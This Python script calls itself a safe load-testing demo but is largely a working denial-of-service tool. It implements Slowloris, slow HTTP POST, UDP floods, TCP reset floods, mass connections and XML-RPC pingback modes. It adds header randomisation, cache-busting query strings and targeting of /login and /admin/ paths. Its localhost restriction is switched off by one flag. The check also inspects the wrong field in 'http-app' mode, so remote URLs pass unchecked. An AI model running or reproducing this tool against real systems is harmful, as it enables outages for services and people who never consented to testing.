#!/usr/bin/env python3
"""
Load-test demonstration script for local or owned servers.
Supports HTTP request bursts and TCP connection stress tests.
Includes advanced demo modes and optional Playwright-like request headers.
This tool is intentionally restricted for safety.
"""

import argparse
import concurrent.futures
import http.client
import logging
import random
import socket
import ssl
import struct
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from http.server import SimpleHTTPRequestHandler
from socketserver import ThreadingTCPServer
from threading import Thread
from xmlrpc.server import SimpleXMLRPCServer
import xmlrpc.client

try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

PLAYWRIGHT_DEVICE_NAMES = [
    "iPhone 13",
    "Pixel 5",
    "Desktop Chrome",
    "Desktop Firefox",
]

LOCAL_HOSTS = {"127.0.0.1", "localhost", "::1"}
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "curl/7.86.0",
    "Wget/1.21.3",
]

REALISTIC_ACCEPTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/javascript, */*; q=0.01",
    "text/html,application/xml;q=0.9,image/webp,*/*;q=0.8",
]

APPLICATION_PATHS = [
    "/",
    "/index.php",
    "/go/",
    "/admin/",
    "/api/track",
    "/login",
    "/redirect",
    "/submit",
]


def normalize_http_url(url: str, app_mode: bool, random_query: bool) -> str:
    parsed = urllib.parse.urlparse(url)
    path = parsed.path or "/"
    if app_mode and path in {"", "/"}:
        path = random.choice(APPLICATION_PATHS)
    query = parsed.query or ""
    if random_query:
        rand = f"rand={random.randint(100000, 999999)}"
        query = f"{query}&{rand}" if query else rand
    return urllib.parse.urlunparse(parsed._replace(path=path, query=query))


thread_local = threading.local()


def start_local_http_server(port: int):
    server = ThreadingTCPServer(("127.0.0.1", port), SimpleHTTPRequestHandler)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"Local HTTP server running on http://127.0.0.1:{port}")
    return server


def start_local_xmlrpc_server(port: int):
    server = SimpleXMLRPCServer(("127.0.0.1", port), logRequests=False, allow_none=True)

    def pingback(source, target):
        return f"received from {source} to {target}"

    server.register_function(pingback, "pingback")
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"Local XML-RPC server running on http://127.0.0.1:{port}")
    return server


def is_local_target(host: str) -> bool:
    normalized = host.lower().strip()
    if normalized.startswith("[") and normalized.endswith("]"):
        normalized = normalized[1:-1]
    return normalized in LOCAL_HOSTS


def ensure_safe_target(target: str, allow_remote: bool, mode: str):
    parsed = urllib.parse.urlparse(target) if mode == "http" else None
    if mode == "http":
        host = parsed.hostname or target
        if not allow_remote and not is_local_target(host):
            raise ValueError("HTTP target must be localhost unless --allow-remote is set.")
    else:
        host = target
        if not allow_remote and not is_local_target(host):
            raise ValueError("TCP target host must be localhost unless --allow-remote is set.")


def build_request(url: str, method: str, headers: dict, data: bytes | None):
    return urllib.request.Request(url, data=data, headers=headers, method=method)


def get_random_playwright_headers() -> dict[str, str]:
    if not PLAYWRIGHT_AVAILABLE:
        return {}

    with sync_playwright() as pw:
        device_name = random.choice(PLAYWRIGHT_DEVICE_NAMES)
        device = pw.devices.get(device_name, {})
        headers = {
            "User-Agent": device.get("user_agent", random.choice(USER_AGENTS)),
            "Accept-Language": device.get("locale", "en-US,en;q=0.9"),
        }
        if device.get("platform"):
            headers["Sec-CH-UA-Platform"] = device["platform"]
        if device.get("device_scale_factor") is not None:
            headers["Sec-CH-UA-Device-Model"] = str(device["device_scale_factor"])
        return headers


def build_http_headers(extra_headers: bool, keepalive: bool, playwright_headers: dict[str, str] | None = None) -> dict[str, str]:
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(REALISTIC_ACCEPTS),
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive" if keepalive else "close",
    }
    if extra_headers:
        headers["Accept-Language"] = random.choice(["en-US,en;q=0.9", "ar-SA,ar;q=0.8,en-US;q=0.6,en;q=0.4"])
        headers["Cache-Control"] = "no-cache"
        headers["Pragma"] = "no-cache"
    if playwright_headers:
        headers.update(playwright_headers)
    return headers


def _get_keepalive_connection(parsed: urllib.parse.ParseResult, timeout: int):
    conn = getattr(thread_local, "conn", None)
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    if conn is None or getattr(conn, "host", None) != parsed.hostname or getattr(conn, "port", None) != port:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass
        if parsed.scheme == "https":
            context = ssl.create_default_context()
            conn = http.client.HTTPSConnection(parsed.hostname, port, timeout=timeout, context=context)
        else:
            conn = http.client.HTTPConnection(parsed.hostname, port, timeout=timeout)
        thread_local.conn = conn
    return conn


def keepalive_http_request(url: str, method: str, payload: str | None, extra_headers: bool, timeout: int = 5, playwright_headers: dict[str, str] | None = None, random_query: bool = False, app_mode: bool = False):
    url = normalize_http_url(url, app_mode, random_query)
    parsed = urllib.parse.urlparse(url)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    headers = build_http_headers(extra_headers, keepalive=True, playwright_headers=playwright_headers)
    body = None
    if method == "POST":
        body = (payload or "message=test").encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Content-Length"] = str(len(body))

    conn = _get_keepalive_connection(parsed, timeout)
    start = time.monotonic()
    try:
        conn.request(method, path, body=body, headers=headers)
        response = conn.getresponse()
        response.read()
        elapsed = time.monotonic() - start
        status = response.status
        return status, elapsed
    except Exception as exc:
        try:
            conn.close()
        except Exception:
            pass
        thread_local.conn = None
        elapsed = time.monotonic() - start
        return str(exc), elapsed


def http_request(url: str, method: str, payload: str | None, extra_headers: bool, timeout: int = 5, playwright_headers: dict[str, str] | None = None, random_query: bool = False, app_mode: bool = False):
    url = normalize_http_url(url, app_mode, random_query)
    headers = build_http_headers(extra_headers, keepalive=False, playwright_headers=playwright_headers)
    data = None
    if method == "POST":
        body = payload or "message=test"
        data = body.encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Content-Length"] = str(len(data))

    request = build_request(url, method, headers, data)
    start = time.monotonic()
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            elapsed = time.monotonic() - start
            return response.status, elapsed
    except urllib.error.HTTPError as exc:
        elapsed = time.monotonic() - start
        return f"HTTP {exc.code}", elapsed
    except Exception as exc:
        elapsed = time.monotonic() - start
        return str(exc), elapsed


def slow_http_post_request(url: str, payload: str, chunk_size: int, chunk_delay: float, extra_headers: bool, timeout: int = 10):
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    headers = {
        "Host": host,
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    if extra_headers:
        headers["Cache-Control"] = "no-cache"
        headers["Accept-Language"] = "en-US,en;q=0.9"

    body = payload.encode("utf-8")
    headers["Content-Length"] = str(len(body))
    request_lines = [f"POST {path} HTTP/1.1"]
    request_lines += [f"{name}: {value}" for name, value in headers.items()]
    request_lines.append("Connection: close")
    request_lines.append("")

    raw_request = "\r\n".join(request_lines).encode("utf-8")
    start = time.monotonic()
    sock = socket.create_connection((host, port), timeout=timeout)
    if parsed.scheme == "https":
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)

    sock.sendall(raw_request)
    offset = 0
    while offset < len(body):
        chunk = body[offset:offset + chunk_size]
        sock.sendall(chunk)
        offset += len(chunk)
        time.sleep(chunk_delay)

    response = b""
    try:
        sock.settimeout(timeout)
        while True:
            data = sock.recv(4096)
            if not data:
                break
            response += data
    except socket.timeout:
        pass
    finally:
        sock.close()

    elapsed = time.monotonic() - start
    return response.split(b" ")[1].decode("utf-8", errors="ignore") if b" " in response else "NO RESPONSE", elapsed


def xmlrpc_request(target: str, source: str, extra_headers: bool, timeout: int = 10):
    proxy = xmlrpc.client.ServerProxy(target, allow_none=True)
    start = time.monotonic()
    try:
        result = proxy.pingback(source, target)
        elapsed = time.monotonic() - start
        return result, elapsed
    except Exception as exc:
        elapsed = time.monotonic() - start
        return str(exc), elapsed


def udp_fragment_test(host: str, port: int, total_packets: int, packet_size: int, rate: float | None, duration: float | None, logger: logging.Logger):
    print(f"Starting UDP fragment-style test: {host}:{port}, packets={total_packets}, size={packet_size}")
    start_time = time.monotonic()
    statuses: dict[str, int] = {}
    packets_sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * packet_size
    interval = 1.0 / rate if rate and rate > 0 else 0.0
    next_send = start_time

    while (duration and time.monotonic() < start_time + duration) or (not duration and packets_sent < total_packets):
        now = time.monotonic()
        if rate and rate > 0 and now < next_send:
            time.sleep(next_send - now)
            continue
        try:
            sock.sendto(payload, (host, port))
            statuses["sent"] = statuses.get("sent", 0) + 1
        except Exception as exc:
            statuses[str(exc)] = statuses.get(str(exc), 0) + 1
        packets_sent += 1
        if rate and rate > 0:
            next_send += interval
        if not duration and packets_sent >= total_packets:
            break

    sock.close()
    elapsed = time.monotonic() - start_time
    logger.info("UDP fragment-style test complete")
    logger.info("Elapsed: %.2f seconds", elapsed)
    logger.info("Packets sent: %d", packets_sent)
    print("UDP fragment-style test complete.")
    print(f"Elapsed: {elapsed:.2f} seconds")
    print(f"Packets sent: {packets_sent}")
    print("Result summary:")
    for status, count in sorted(statuses.items()):
        print(f"  {status}: {count}")


def tcp_connection_single(host: str, port: int, send_payload: bool, timeout: int = 5):
    start = time.monotonic()
    sock = None
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if send_payload:
            payload = (
                f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
            ).encode("utf-8")
            sock.sendall(payload)
        return "OK", time.monotonic() - start
    except Exception as exc:
        return str(exc), time.monotonic() - start
    finally:
        if sock is not None:
            try:
                sock.close()
            except Exception:
                pass


def tcp_connection_test(
    host: str,
    port: int,
    total_connections: int,
    workers: int,
    send_payload: bool,
    rate: float | None,
    duration: float | None,
    logger: logging.Logger,
):
    if total_connections <= 0 and not duration:
        total_connections = 100

    print(
        f"Starting TCP connection test: {host}:{port}, connections={total_connections}, workers={workers}"
    )
    start_time = time.monotonic()
    statuses: dict[str, int] = {}
    latencies: list[float] = []
    futures = []
    interval = 1.0 / rate if rate and rate > 0 else 0.0
    next_send = start_time

    def submit_connection(executor):
        return executor.submit(tcp_connection_single, host, port, send_payload)

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        if duration and duration > 0:
            end_time = start_time + duration
            attempts = 0
            while time.monotonic() < end_time:
                now = time.monotonic()
                if rate and rate > 0 and now < next_send:
                    time.sleep(next_send - now)
                    continue
                futures.append(submit_connection(executor))
                attempts += 1
                if rate and rate > 0:
                    next_send += interval
            print(f"Submitted {attempts} connections in {duration:.1f}s")
        else:
            for _ in range(total_connections):
                now = time.monotonic()
                if rate and rate > 0 and now < next_send:
                    time.sleep(next_send - now)
                futures.append(submit_connection(executor))
                if rate and rate > 0:
                    next_send += interval

        for future in concurrent.futures.as_completed(futures):
            status, latency = future.result()
            statuses[str(status)] = statuses.get(str(status), 0) + 1
            if isinstance(latency, float):
                latencies.append(latency)

    elapsed = time.monotonic() - start_time
    success_count = statuses.get("OK", 0)
    error_count = sum(count for status, count in statuses.items() if status != "OK")

    logger.info("TCP connection test complete")
    logger.info("Elapsed: %.2f seconds", elapsed)
    logger.info("Total connections: %d", sum(statuses.values()))
    logger.info("Successes: %d  Errors: %d", success_count, error_count)

    print("TCP connection test complete.")
    print(f"Elapsed: {elapsed:.2f} seconds")
    print(f"Connections: {sum(statuses.values())}  Success: {success_count}  Error: {error_count}")
    if latencies:
        print(
            f"Latency avg={1000 * (sum(latencies) / len(latencies)):.1f}ms  min={1000 * min(latencies):.1f}ms  max={1000 * max(latencies):.1f}ms"
        )
    print("Result summary:")
    for status, count in sorted(statuses.items()):
        print(f"  {status}: {count}")


def udp_flood_test(host: str, port: int, total_packets: int, packet_size: int, rate: float | None, duration: float | None, logger: logging.Logger):
    print(f"Starting UDP flood test: {host}:{port}, packets={total_packets}, size={packet_size}")
    start_time = time.monotonic()
    statuses: dict[str, int] = {}
    packets_sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * packet_size
    interval = 1.0 / rate if rate and rate > 0 else 0.0
    next_send = start_time

    while (duration and time.monotonic() < start_time + duration) or (not duration and packets_sent < total_packets):
        now = time.monotonic()
        if rate and rate > 0 and now < next_send:
            time.sleep(next_send - now)
            continue
        try:
            sock.sendto(payload, (host, port))
            statuses["sent"] = statuses.get("sent", 0) + 1
        except Exception as exc:
            statuses[str(exc)] = statuses.get(str(exc), 0) + 1
        packets_sent += 1
        if rate and rate > 0:
            next_send += interval
        if not duration and packets_sent >= total_packets:
            break

    sock.close()
    elapsed = time.monotonic() - start_time
    logger.info("UDP flood test complete")
    logger.info("Elapsed: %.2f seconds", elapsed)
    logger.info("Packets sent: %d", packets_sent)
    print("UDP flood test complete.")
    print(f"Elapsed: {elapsed:.2f} seconds")
    print(f"Packets sent: {packets_sent}")
    print("Result summary:")
    for status, count in sorted(statuses.items()):
        print(f"  {status}: {count}")


def slowloris_test(host: str, port: int, total_connections: int, rate: float | None, duration: float | None, logger: logging.Logger):
    print(f"Starting Slowloris test: {host}:{port}, sockets={total_connections}")
    start_time = time.monotonic()
    sockets: list[socket.socket] = []
    failures = 0
    interval = 1.0 / rate if rate and rate > 0 else 0.0
    next_send = start_time
    attempts = 0

    while (duration and time.monotonic() < start_time + duration) or (not duration and attempts < total_connections):
        now = time.monotonic()
        if rate and rate > 0 and now < next_send:
            time.sleep(next_send - now)
            continue
        try:
            sock = socket.create_connection((host, port), timeout=5)
            sock.settimeout(5)
            request = (
                f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nAccept: {random.choice(REALISTIC_ACCEPTS)}\r\nConnection: keep-alive\r\nContent-Length: 10000\r\n"
            )
            sock.sendall(request.encode("utf-8"))
            sockets.append(sock)
        except Exception:
            failures += 1
        attempts += 1
        if rate and rate > 0:
            next_send += interval
        if not duration and attempts >= total_connections:
            break

    logger.info("Slowloris sockets opened: %d", len(sockets))
    time.sleep(1.0)
    for sock in list(sockets):
        try:
            sock.sendall(b"\r\n")
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
            sockets.remove(sock)

    for sock in sockets:
        try:
            sock.close()
        except Exception:
            pass

    elapsed = time.monotonic() - start_time
    logger.info("Slowloris test complete")
    logger.info("Elapsed: %.2f seconds", elapsed)
    logger.info("Connections attempted: %d", attempts)
    logger.info("Successes: %d  Failures: %d", len(sockets), failures)
    print("Slowloris test complete.")
    print(f"Elapsed: {elapsed:.2f} seconds")
    print(f"Connections attempted: {attempts}  Successes: {len(sockets)}  Failures: {failures}")


def tcp_rst_single(host: str, port: int, timeout: int = 5):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        linger = struct.pack("ii", 1, 0)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, linger)
        sock.close()
        return True
    except Exception as exc:
        return str(exc)


def tcp_rst_test(host: str, port: int, total_connections: int, rate: float | None, duration: float | None, logger: logging.Logger):
    print(f"Starting TCP reset-style test: {host}:{port}, attempts={total_connections}")
    start_time = time.monotonic()
    statuses: dict[str, int] = {}
    attempts = 0
    interval = 1.0 / rate if rate and rate > 0 else 0.0
    next_send = start_time

    while (duration and time.monotonic() < start_time + duration) or (not duration and attempts < total_connections):
        now = time.monotonic()
        if rate and rate > 0 and now < next_send:
            time.sleep(next_send - now)
            continue
        result = tcp_rst_single(host, port)
        status = "OK" if result is True else str(result)
        statuses[status] = statuses.get(status, 0) + 1
        attempts += 1
        if rate and rate > 0:
            next_send += interval
        if not duration and attempts >= total_connections:
            break

    elapsed = time.monotonic() - start_time
    logger.info("TCP reset-style test complete")
    logger.info("Elapsed: %.2f seconds", elapsed)
    logger.info("Attempts: %d", attempts)
    print("TCP reset-style test complete.")
    print(f"Elapsed: {elapsed:.2f} seconds")
    print(f"Attempts: {attempts}")
    print("Result summary:")
    for status, count in sorted(statuses.items()):
        print(f"  {status}: {count}")


def http_load_test(url: str, total_requests: int, workers: int, method: str, payload: str | None, rate: float | None, duration: float | None, extra_headers: bool, use_playwright: bool, keepalive: bool, random_query: bool, app_mode: bool, logger: logging.Logger):
    mode_name = "http-app" if app_mode else "http"
    connection_mode = "keepalive" if keepalive else "single-connection"
    print(
        f"Starting HTTP load test: {method} {url}, workers={workers}, mode={mode_name}, connection={connection_mode}"
    )
    start_time = time.monotonic()
    statuses: dict[str, int] = {}
    latencies: list[float] = []
    futures = []

    def submit_request(executor):
        playwright_headers = get_random_playwright_headers() if use_playwright else None
        if keepalive:
            return executor.submit(
                keepalive_http_request,
                url,
                method,
                payload,
                extra_headers,
                5,
                playwright_headers,
                random_query,
                app_mode,
            )
        return executor.submit(
            http_request,
            url,
            method,
            payload,
            extra_headers,
            5,
            playwright_headers,
            random_query,
            app_mode,
        )

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        if duration and duration > 0:
            end_time = start_time + duration
            interval = 1.0 / rate if rate and rate > 0 else 0.0
            next_submission = start_time
            sent = 0
            while time.monotonic() < end_time and (total_requests <= 0 or sent < total_requests):
                now = time.monotonic()
                if rate and rate > 0 and now < next_submission:
                    time.sleep(next_submission - now)
                    continue
                futures.append(submit_request(executor))
                sent += 1
                if rate and rate > 0:
                    next_submission += interval
            print(f"Submitted {sent} requests in {duration:.1f}s")
        else:
            for _ in range(total_requests):
                futures.append(submit_request(executor))

        for future in concurrent.futures.as_completed(futures):
            status, latency = future.result()
            statuses[str(status)] = statuses.get(str(status), 0) + 1
            if isinstance(latency, float):
                latencies.append(latency)

    elapsed = time.monotonic() - start_time
    success_count = sum(count for status, count in statuses.items() if status.isdigit() and 200 <= int(status) < 400)
    error_count = sum(count for status, count in statuses.items() if not (status.isdigit() and 200 <= int(status) < 400))

    logger.info("HTTP load complete")
    logger.info("Elapsed: %.2f seconds", elapsed)
    logger.info("Total requests: %d", sum(statuses.values()))
    logger.info("Successes: %d  Errors: %d", success_count, error_count)
    if latencies:
        logger.info("Latency ms: avg=%.2f  min=%.2f  max=%.2f", 1000 * (sum(latencies) / len(latencies)), 1000 * min(latencies), 1000 * max(latencies))

    print("HTTP load complete.")
    print(f"Elapsed: {elapsed:.2f} seconds")
    print(f"Requests: {sum(statuses.values())}  Success: {success_count}  Error: {error_count}")
    if latencies:
        print(f"Latency avg={1000 * (sum(latencies) / len(latencies)):.1f}ms  min={1000 * min(latencies):.1f}ms  max={1000 * max(latencies):.1f}ms")
    print("Status summary:")
    for status, count in sorted(statuses.items()):
        print(f"  {status}: {count}")


def parse_args():
    parser = argparse.ArgumentParser(description="Safe load-test demonstration script.")
    parser.add_argument("--mode", choices=["http", "http-app", "tcp", "slow-http", "slowloris", "xmlrpc", "udp-frag", "udp-flood", "tcp-rst"], required=True, help="Choose the demo mode.")
    parser.add_argument("--target", default="http://127.0.0.1:8000", help="Target URL for HTTP and XML-RPC modes.")
    parser.add_argument("--host", default="127.0.0.1", help="Target host for TCP and UDP modes.")
    parser.add_argument("--port", type=int, default=8000, help="Target port for TCP, UDP, and local server.")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method to use.")
    parser.add_argument("--payload", default="message=test", help="POST data payload for HTTP or slow HTTP mode.")
    parser.add_argument("--requests", type=int, default=100, help="Number of HTTP requests to send.")
    parser.add_argument("--connections", type=int, default=100, help="Number of TCP connections to open.")
    parser.add_argument("--workers", type=int, default=20, help="Number of concurrent worker threads.")
    parser.add_argument("--rate", type=float, default=0.0, help="Requests or connections per second (0 for no rate limit).")
    parser.add_argument("--duration", type=float, default=0.0, help="Run the test for a number of seconds instead of a fixed count.")
    parser.add_argument("--send-payload", action="store_true", help="Send a small payload after TCP connect.")
    parser.add_argument("--extra-headers", action="store_true", help="Add extra HTTP headers to each request.")
    parser.add_argument("--use-playwright", action="store_true", help="Add random Playwright-like browser headers to HTTP requests.")
    parser.add_argument("--keepalive", action="store_true", help="Reuse HTTP keep-alive connections for repeated requests.")
    parser.add_argument("--random-query", action="store_true", help="Append a random query parameter to each HTTP request.")
    parser.add_argument("--allow-remote", action="store_true", help="Allow testing remote hosts (use carefully).")
    parser.add_argument("--log", default="", help="Optional log file path.")
    parser.add_argument("--confirm", action="store_true", help="Confirm that you own or are authorized to test the target.")
    parser.add_argument("--start-local-server", action="store_true", help="Start a local HTTP server on the target port before testing.")
    parser.add_argument("--xmlrpc-server", action="store_true", help="Start a local XML-RPC server for xmlrpc demo mode.")
    parser.add_argument("--udp-packet-size", type=int, default=128, help="Packet size for UDP fragment-style test.")
    parser.add_argument("--slow-chunk-size", type=int, default=16, help="Chunk size in bytes for slow HTTP POST mode.")
    parser.add_argument("--slow-chunk-delay", type=float, default=0.5, help="Delay in seconds between chunks for slow HTTP POST.")
    parser.add_argument("--tcp-rst-count", type=int, default=100, help="Number of resets/attempts for tcp-rst mode.")
    return parser.parse_args()


def configure_logger(log_path: str | None) -> logging.Logger:
    logger = logging.getLogger("load_test")
    logger.setLevel(logging.INFO)
    handler: logging.Handler
    if log_path:
        handler = logging.FileHandler(log_path, encoding="utf-8")
    else:
        handler = logging.StreamHandler(sys.stdout)
    formatter = logging.Formatter("%(asctime)s %(levelname)s %(message)s")
    handler.setFormatter(formatter)
    logger.handlers = [handler]
    return logger


def main():
    args = parse_args()
    if not args.confirm:
        print("Error: you must pass --confirm to run this load test.")
        sys.exit(1)

    if args.duration > 0 and args.rate <= 0:
        print("Error: --duration requires --rate to be greater than zero.")
        sys.exit(1)

    logger = configure_logger(args.log if args.log else None)

    try:
        if args.mode in {"http", "slow-http", "xmlrpc"}:
            ensure_safe_target(args.target, args.allow_remote, "http")
        else:
            ensure_safe_target(args.host, args.allow_remote, "tcp")
    except ValueError as exc:
        print(f"Safety check failed: {exc}")
        sys.exit(1)

    server = None
    xmlrpc_server = None
    if args.start_local_server and args.mode in {"http", "http-app"}:
        server = start_local_http_server(args.port)
        time.sleep(0.5)
    if args.xmlrpc_server and args.mode == "xmlrpc":
        xmlrpc_server = start_local_xmlrpc_server(args.port)
        time.sleep(0.5)

    if args.mode in {"http", "http-app"}:
        total_requests = args.requests if args.requests > 0 else 0
        duration = args.duration if args.duration > 0 else None
        rate = args.rate if args.rate > 0 else None
        if args.use_playwright and not PLAYWRIGHT_AVAILABLE:
            print("Warning: Playwright package is not installed; --use-playwright will be ignored.")
        http_load_test(
            args.target,
            total_requests,
            args.workers,
            args.method,
            args.payload,
            rate,
            duration,
            args.extra_headers,
            args.use_playwright,
            args.keepalive,
            args.random_query,
            args.mode == "http-app",
            logger,
        )
    elif args.mode == "slow-http":
        count = args.requests if args.requests > 0 else int(args.rate * args.duration) if args.duration > 0 and args.rate > 0 else 10
        for _ in range(count):
            status, elapsed = slow_http_post_request(args.target, args.payload, args.slow_chunk_size, args.slow_chunk_delay, args.extra_headers)
            print(f"Slow HTTP POST result: {status} elapsed={elapsed:.2f}s")
    elif args.mode == "slowloris":
        duration = args.duration if args.duration > 0 else None
        rate = args.rate if args.rate > 0 else None
        slowloris_test(args.host, args.port, args.connections, rate, duration, logger)
    elif args.mode == "xmlrpc":
        status, elapsed = xmlrpc_request(args.target, "http://127.0.0.1/source", args.extra_headers)
        print(f"XML-RPC pingback demo result: {status} elapsed={elapsed:.2f}s")
    elif args.mode == "udp-frag":
        duration = args.duration if args.duration > 0 else None
        rate = args.rate if args.rate > 0 else None
        udp_fragment_test(args.host, args.port, args.requests, args.udp_packet_size, rate, duration, logger)
    elif args.mode == "udp-flood":
        duration = args.duration if args.duration > 0 else None
        rate = args.rate if args.rate > 0 else None
        udp_flood_test(args.host, args.port, args.requests, args.udp_packet_size, rate, duration, logger)
    elif args.mode == "tcp-rst":
        duration = args.duration if args.duration > 0 else None
        rate = args.rate if args.rate > 0 else None
        tcp_rst_test(args.host, args.port, args.tcp_rst_count, rate, duration, logger)
    else:
        total_connections = args.connections if args.connections > 0 else 0
        duration = args.duration if args.duration > 0 else None
        rate = args.rate if args.rate > 0 else None
        tcp_connection_test(args.host, args.port, total_connections, args.workers, args.send_payload, rate, duration, logger)

    if server:
        server.shutdown()
        print("Local HTTP server stopped.")
    if xmlrpc_server:
        xmlrpc_server.shutdown()
        print("Local XML-RPC server stopped.")


if __name__ == "__main__":
    main()
